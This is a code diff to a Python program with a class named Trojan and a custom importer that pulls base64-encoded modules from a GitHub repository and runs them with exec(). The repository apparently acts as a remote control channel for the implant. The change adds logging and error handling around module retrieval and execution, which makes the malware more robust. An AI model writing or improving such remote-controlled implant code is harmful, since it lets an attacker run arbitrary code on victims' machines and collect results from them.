@@ -70,8 +70,14 @@ class Trojan:
         self.send_command_result(command, result)
 
     def module_runner(self, module):
-        result = sys.modules[module].run()
-        self.store_module_result(result)
+        print(f"[*] Running module: {module}")
+        try:
+            result = sys.modules[module].run()
+            self.store_module_result(result)
+        except KeyError:
+            print(f"[!] Module {module} not found in sys.modules")
+        except Exception as e:
+            print(f"[!] Error running module {module}: {e}")
 
     def store_module_result(self, data):
         message = datetime.now().isoformat()
@@ -116,16 +122,28 @@ class GitImporter:
             new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
             if new_library is not None:
                 self.current_module_code = base64.b64decode(new_library)
+                print(f"[*] Successfully retrieved and decoded {fullname}")
                 return importlib.util.spec_from_loader(fullname, loader=self)
+            else:
+                print(f"[!] Failed to retrieve {fullname}")
         except github3.exceptions.NotFoundError:
             print(f"[*] Module {fullname} not found in repository.")
             return None
+        except Exception as e:
+            print(f"[!] Error retrieving module {fullname}: {e}")
+            return None
 
     def create_module(self, spec):
+        print(f"[*] Creating module {spec.name}")
         return None
 
     def exec_module(self, module):
-        exec(self.current_module_code, module.__dict__)
+        print(f"[*] Executing module {module.__name__}")
+        try:
+            exec(self.current_module_code, module.__dict__)
+            print(f"[*] Successfully executed module {module.__name__}")
+        except Exception as e:
+            print(f"[!] Error executing module {module.__name__}: {e}")
 
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())
